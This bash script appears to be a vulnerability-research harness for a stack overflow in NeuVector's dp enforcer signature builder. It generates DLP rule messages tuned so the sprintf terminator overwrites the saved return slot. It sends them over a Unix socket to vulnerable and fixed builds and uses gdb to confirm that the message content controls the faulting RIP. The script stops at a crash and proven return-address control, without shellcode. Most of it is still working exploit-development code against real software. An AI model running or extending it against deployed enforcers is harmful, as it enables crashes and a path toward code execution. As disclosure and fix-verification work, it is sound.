#!/usr/bin/env bash
# W285: tune the REST-valid DLP message so the final sprintf NUL lands in
# the saved return slot, then read the live -O2 full enforcer dp frame and
# observe where control actually transfers. This is rung-4 mechanics only:
# the faulting RIP is wire-determined but is an unmapped pointer built from
# the pinned controller's fixed "; context <allowed>" suffix, NOT a chosen
# executable address. No command, no r5. All provisioning stays under lab/.
set -u
cd "$(dirname "$0")"
pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
die() { echo "FAIL $1"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
has() { grep -q -- "$2" "$1" 2>/dev/null; }

ROOT=$(readlink -f ../src/real/neuvector-48ae8b5cac5ec3a7e332e5272e9b3050f44396cb)
DEPS=$(readlink -f ../src/deps)
RLIB=$DEPS/root/usr/lib/x86_64-linux-gnu
OUT=$(pwd)/out
SOCK=/tmp/dp_listen.sock
WIRE=$(cd ../wirepath && pwd)
ATTACK=$WIRE/out/wire-attack.json
SAFE=$WIRE/out/wire-safe.json
mkdir -p out "$DEPS/run" ../src/real
if [ ! -f "$ATTACK" ] || [ ! -f "$SAFE" ]; then
    echo "provisioning wire messages via realcaller/run.sh + wirepath/run.sh"
    bash ../realcaller/run.sh > out/provision-realcaller.log 2>&1 && \
        bash ../wirepath/run.sh > out/provision-wirepath.log 2>&1 || die "wire message provisioning"
fi
if [ ! -f "$OUT/dp-plain-vuln" ] || [ ! -f "$OUT/dp-plain-fixed" ]; then
    echo "provisioning plain full enforcer binaries via frame.sh"
    bash frame.sh > out/provision-frame.log 2>&1 || die "frame.sh provisioning"
fi
[ -f "$ROOT/dp/dpi/sig/dpi_sig.c" ] || die "pinned tree missing"
[ -f "$RLIB/libhs.so" ] || die "lab hyperscan/dev cache missing"
export LD_LIBRARY_PATH="$RLIB"

BODY=$OUT/wire-return-body.json
URL=$OUT/wire-return-url.json
python3 - "$ATTACK" "$BODY" "$URL" <<'PY' || die "tuned wire generation"
import json, sys
src, body, url = sys.argv[1:4]
d = json.load(open(src))
for dst, ctx, value_len in ((body, "body", 12), (url, "url", 13)):
    copy = json.loads(json.dumps(d))
    rule = copy["ctrl_bld_dlp"]["dlp_rules"][0]
    # 15 full patterns (15*64=960 B pre-expansion) plus one short pattern;
    # total sprintf content ends at dlpsig_buf+2110, its NUL at +2110 and
    # the original zero at +2111 remain the two high return-slot bytes.
    rule["patterns"][15] = "/" + "X" * value_len + "/is; context " + ctx
    raw = json.dumps(copy, separators=(",", ":")).encode()
    open(dst, "wb").write(raw)
    print("GENERATED %s bytes=%d context=%s pre_total=%d" %
          (dst, len(raw), ctx, 15 * 64 + value_len))
PY
[ "$(stat -c %s "$BODY")" -eq 2149 ] && ok "body-context tuned datagram is 2149 bytes" || bad "body-context tuned datagram is 2149 bytes"
[ "$(stat -c %s "$URL")" -eq 2149 ] && ok "url-context tuned datagram is 2149 bytes" || bad "url-context tuned datagram is 2149 bytes"

send_and_wait() {
    local bin="$1" msg="$2" name="$3"
    rm -f "$SOCK" "$OUT/$name.sent"
    (for _ in $(seq 1 150); do [ -S "$SOCK" ] && break; sleep 0.1; done
     python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.sendto(d,sys.argv[2]); print("SENT bytes=%d"%len(d))' \
        "$msg" "$SOCK") > "$OUT/$name.sent" 2>&1 &
    local sender=$!
    (cd "$DEPS/run" && timeout 4 "$bin" -s -n 1 > "$OUT/$name.log" 2>&1; echo "RC=$?" >> "$OUT/$name.log") &
    local pid=$!
    for _ in $(seq 1 100); do [ -S "$SOCK" ] && break; sleep 0.1; done
    [ -S "$SOCK" ] || { wait "$sender" 2>/dev/null || true; wait "$pid" 2>/dev/null || true; rm -f "$SOCK"; return 1; }
    wait "$sender" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    rm -f "$SOCK"
}

# Plain non-gdb controls: tuned message faults only the vulnerable binary;
# the fixed binary skips it and the short safe datagram is clean.
send_and_wait "$OUT/dp-plain-vuln" "$BODY" tuned-vuln
send_and_wait "$OUT/dp-plain-vuln" "$SAFE" tuned-safe
send_and_wait "$OUT/dp-plain-fixed" "$BODY" tuned-fixed
has "$OUT/tuned-vuln.sent" "SENT bytes=2149" && ok "vulnerable enforcer received the tuned datagram" || bad "vulnerable enforcer received the tuned datagram"
grep -qE 'RC=139' "$OUT/tuned-vuln.log" && ok "tuned message faults the vulnerable enforcer (rc 139)" || bad "tuned message faults the vulnerable enforcer (rc 139)"
! grep -qE 'RC=(139|134)' "$OUT/tuned-safe.log" && ok "safe message: vulnerable enforcer survives" || bad "safe message: vulnerable enforcer survives"
! grep -qE 'RC=(139|134)' "$OUT/tuned-fixed.log" && ok "fixed enforcer survives the tuned message" || bad "fixed enforcer survives the tuned message"
has "$OUT/tuned-fixed.log" "exceeds max sig len(2048)" && ok "fixed enforcer skips the oversized rule" || bad "fixed enforcer skips the oversized rule"

# Under gdb (ASLR disabled for the inferior) read the post-overwrite frame,
# then continue and observe the actual wire-determined faulting RIP.
frame_case() {
    local msg="$1" name="$2"
    rm -f "$SOCK" "$OUT/$name.sent"
    (for _ in $(seq 1 150); do [ -S "$SOCK" ] && break; sleep 0.1; done
     python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.sendto(d,sys.argv[2]); print("SENT bytes=%d"%len(d))' \
        "$msg" "$SOCK") > "$OUT/$name.sent" 2>&1 &
    local sender=$!
    (cd "$ROOT" && timeout 30 gdb -q -batch \
        -ex 'set pagination off' \
        -ex 'break dpi_sig.c:662' \
        -ex 'run -s -n 1' \
        -ex 'printf "FRAME BUF=%p RBP=%p DELTA=%ld LEN=%d\n", &dlpsig_buf[0], $rbp, (long)($rbp - &dlpsig_buf[0]), len' \
        -ex 'printf "SAVED slot0=%p slot1=%p\n", *(void **)$rbp, *(void **)((char *)$rbp+8)' \
        -ex 'x/16xb &dlpsig_buf[2096]' \
        -ex 'continue' \
        -ex 'printf "AFTER rip=%p rsp=%p\n", $rip, $rsp' \
        -ex 'bt 2' \
        --args "$OUT/dp-plain-vuln" -s -n 1) > "$OUT/$name.log" 2>&1 || true
    wait "$sender" 2>/dev/null || true
    rm -f "$SOCK"
    grep -E 'Breakpoint|FRAME|SAVED|Program received|AFTER|^0x7' "$OUT/$name.log" | head -12
}
frame_case "$BODY" gdb-body
frame_case "$URL"  gdb-url
for name in gdb-body gdb-url; do
    has "$OUT/$name.sent" "SENT bytes=" && ok "$name: datagram delivered" || bad "$name: datagram delivered"
    grep -q 'hit Breakpoint 1, dpi_sig_bld.*dpi_sig.c:662' "$OUT/$name.log" && \
        ok "$name: tuned rule reaches the epilogue (no fault inside dpi_sig_bld)" || \
        bad "$name: tuned rule reaches the epilogue (no fault inside dpi_sig_bld)"
    has "$OUT/$name.log" 'FRAME BUF=' && has "$OUT/$name.log" 'DELTA=2096 LEN=2110' && \
        ok "$name: live frame BUF-to-RBP 2096, final length 2110" || bad "$name: live frame BUF-to-RBP 2096, final length 2110"
done
grep -q 'slot1=0x3b79646f6220' "$OUT/gdb-body.log" && \
    ok "body suffix determines saved return slot 0x3b79646f6220" || bad "body suffix determines saved return slot 0x3b79646f6220"
grep -q 'AFTER rip=0x3b79646f6220' "$OUT/gdb-body.log" && \
    ok "body suffix determines the faulting RIP at return" || bad "body suffix determines the faulting RIP at return"
grep -q 'slot1=0x3b6c72752074' "$OUT/gdb-url.log" && \
    ok "url suffix determines saved return slot 0x3b6c72752074" || bad "url suffix determines saved return slot 0x3b6c72752074"
grep -q 'AFTER rip=0x3b6c72752074' "$OUT/gdb-url.log" && \
    ok "url suffix determines the faulting RIP at return" || bad "url suffix determines the faulting RIP at return"
! cmp -s <(grep '^SAVED ' "$OUT/gdb-body.log") <(grep '^SAVED ' "$OUT/gdb-url.log") && \
    ok "wire context controls the post-overwrite return word" || bad "wire context controls the post-overwrite return word"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
